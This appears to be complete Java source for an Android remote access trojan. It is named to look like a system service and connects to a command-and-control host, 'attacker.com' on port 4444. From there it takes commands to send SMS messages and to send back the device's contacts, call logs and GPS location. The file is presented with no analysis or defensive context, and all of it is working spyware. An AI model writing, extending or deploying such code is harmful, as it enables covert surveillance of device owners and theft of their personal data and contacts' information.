package com.system.admin;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.location.LocationManager;
import android.location.Location;
import java.io.*;
import java.net.Socket;

public class SystemService extends Service {
    private static final String C2_SERVER = "attacker.com";
    private static final int C2_PORT = 4444;
    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> connectToC2()).start();
        return START_STICKY;
    }

    private void connectToC2() {
        try {
            socket = new Socket(C2_SERVER, C2_PORT);
            writer = new PrintWriter(socket.getOutputStream(), true);
            reader = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );

            writer.println("RAT_ONLINE");
            String command;
            while ((command = reader.readLine()) != null) {
                executeCommand(command);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void executeCommand(String cmd) {
        try {
            String[] parts = cmd.split("\\|");
            String action = parts[0];

            switch (action) {
                case "SMS":
                    sendSMS(parts[1], parts[2]);
                    break;
                case "CONTACTS":
                    getContacts();
                    break;
                case "CALLS":
                    getCallLogs();
                    break;
                case "LOCATION":
                    getLocation();
                    break;
            }
        } catch (Exception e) {
            writer.println("ERROR: " + e.getMessage());
        }
    }

    private void sendSMS(String number, String message) {
        SmsManager.getDefault().sendTextMessage(number, null, message, null, null);
        writer.println("SMS_SENT");
    }

    private void getContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(
                    cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                sb.append(name).append("\n");
            }
            cursor.close();
        }
        writer.println("CONTACTS:" + sb.toString());
    }

    private void getCallLogs() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(
            CallLog.Calls.CONTENT_URI, null, null, null,
            CallLog.Calls.DATE + " DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(
                    cursor.getColumnIndex(CallLog.Calls.NUMBER));
                sb.append(number).append("\n");
            }
            cursor.close();
        }
        writer.println("CALLS:" + sb.toString());
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager)
                getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc != null) {
                writer.println("LOC:" + loc.getLatitude() + "," + loc.getLongitude());
            }
        } catch (Exception e) {
            writer.println("ERROR: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
